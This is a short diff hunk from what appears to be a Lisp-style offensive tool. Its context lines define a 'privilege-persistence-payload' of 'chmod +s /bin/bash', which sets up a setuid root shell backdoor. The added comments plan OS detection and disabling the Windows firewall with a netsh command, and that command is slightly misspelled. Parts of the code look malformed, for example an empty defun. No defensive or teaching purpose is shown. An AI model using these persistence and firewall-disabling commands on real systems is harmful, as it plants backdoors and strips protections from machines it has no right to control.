@@ -24,3 +24,7 @@
 
 (defun privilege)
 (defvar privilege-persistence-payload "chmod +s /bin/bash")
+
+;; Add Windows & OS detection
+;; Windows deactivate firewall
+;; netsh advfirewall set allprofiles states off
